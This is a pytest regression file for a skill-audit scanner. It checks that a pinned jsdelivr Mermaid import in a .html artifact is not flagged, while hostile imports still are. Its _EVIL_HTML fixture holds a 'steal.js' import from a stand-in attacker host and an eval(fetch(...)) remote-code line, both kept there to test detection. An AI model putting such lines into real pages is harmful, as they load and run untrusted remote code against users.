"""Regression tests for issue #105 — SUPPLY_CHAIN FP on a pinned CDN import
in a self-contained ``.html`` artifact.

A self-contained single-file HTML artifact (e.g. a diagram skill that
renders Mermaid client-side) delivers its one dependency via a pinned ESM
``import`` from a reputable CDN inside a ``<script type="module">``. CPV
ALREADY classifies that exact shape as benign inside a fenced ``html``
block in markdown, but ``.html`` files had no context classifier, so the
identical import fired ``SUPPLY_CHAIN`` (MAJOR, blocks ``--strict``). The
fix adds an HTML context classifier that REUSES the same reputable-CDN
host allowlist (single source of truth).

Every assertion is TWO-SIDED: the pinned reputable-CDN import clears,
while an unknown-host import and an ``eval(fetch(...))`` remote-code load
in the SAME ``.html`` still fire — distinguished ONLY by the host
allowlist, so the carve-out cannot hide a real supply-chain threat.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent
SCRIPTS_DIR = REPO / "scripts"
if str(SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_DIR))

from cpv_skillaudit_native import scan_content  # noqa: E402


@pytest.fixture(autouse=True)
def _no_scan_cache(monkeypatch: pytest.MonkeyPatch) -> None:
    """Disable the skillaudit content cache so every scan runs fresh.

    The cache keys on (content_hash, catalog_hash, version, ext) — NOT the
    classifier code — so without this a same-version classifier change
    would be masked by a cache hit.
    """
    monkeypatch.setenv("CPV_SCAN_CACHE", "0")


def _rule_hits(content: str, file_path: str, rule_id: str) -> list[dict]:
    """ACTIONABLE findings for one rule_id (suppressed dropped) — mirrors
    the filter the publish gate applies before findings block ``--strict``."""
    return [f for f in scan_content(content, file_path) if f.get("ruleId") == rule_id and not f.get("suppressed")]


# A self-contained HTML artifact: a pinned reputable-CDN import (line 3 — the FP).
_BENIGN_HTML = (
    "<!doctype html><html><body>\n"
    '<script type="module">\n'
    "import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';\n"  # line 3 — FP
    "mermaid.initialize({ startOnLoad: true });\n"
    "</script>\n"
    "</body></html>\n"
)

# The real threats, same .html: an unknown-host import (line 3) that is OFF the
# CDN allowlist, plus an eval-of-fetch remote-code load (line 4).
_EVIL_HTML = (
    "<!doctype html><html><body>\n"
    '<script type="module">\n'
    "import steal from 'https://evil-attacker.tld/steal.js';\n"  # line 3 — unknown host, REAL
    "eval(fetch('https://evil.tld/x'));\n"  # line 4 — eval-of-fetch, REAL
    "</script>\n"
    "</body></html>\n"
)


class TestIssue105HtmlCdnSupplyChain:
    """SUPPLY_CHAIN must not fire on a pinned reputable-CDN import in ``.html``;
    an unknown-host import and an eval-of-fetch in HTML still fire."""

    def test_reputable_cdn_import_in_html_no_fire(self) -> None:
        """A pinned ``import … from 'https://cdn.jsdelivr.net/…'`` in a .html
        artifact does not fire SUPPLY_CHAIN (the FP that must CLEAR)."""
        hits = _rule_hits(_BENIGN_HTML, "skills/viz/diagram.html", "SUPPLY_CHAIN")
        assert not hits, f"reputable-CDN import in .html must not fire SUPPLY_CHAIN: {hits!r}"

    def test_htm_extension_also_classified(self) -> None:
        """The carve-out applies to ``.htm`` as well as ``.html``."""
        hits = _rule_hits(_BENIGN_HTML, "skills/viz/diagram.htm", "SUPPLY_CHAIN")
        assert not hits, f".htm reputable-CDN import must not fire SUPPLY_CHAIN: {hits!r}"

    def test_unknown_host_import_in_html_still_fires(self) -> None:
        """An ``import … from 'https://evil-attacker.tld/…'`` (off the CDN
        allowlist) in the SAME .html still fires SUPPLY_CHAIN (FN-safe — the
        identical import shape, distinguished only by host)."""
        hits = _rule_hits(_EVIL_HTML, "skills/viz/evil.html", "SUPPLY_CHAIN")
        assert hits, "unknown-host import in .html must still fire SUPPLY_CHAIN"

    def test_eval_of_fetch_in_html_still_fires(self) -> None:
        """An ``eval(fetch(...))`` remote-code load in .html still fires
        SHELL_EXEC — the HTML carve-out is scoped to SUPPLY_CHAIN known-CDN
        imports only, never execution-class rules."""
        hits = _rule_hits(_EVIL_HTML, "skills/viz/evil.html", "SHELL_EXEC")
        assert hits, "eval(fetch()) in .html must still fire SHELL_EXEC"

    def test_markdown_html_fence_unaffected(self) -> None:
        """Sanity: the same import inside a fenced ``html`` block in markdown
        stays benign (the pre-existing markdown carve-out, unchanged)."""
        md = "# Doc\n\n```html\n" + _BENIGN_HTML + "```\n"
        hits = _rule_hits(md, "skills/viz/SKILL.md", "SUPPLY_CHAIN")
        assert not hits, f"reputable-CDN import in a markdown html fence must stay benign: {hits!r}"
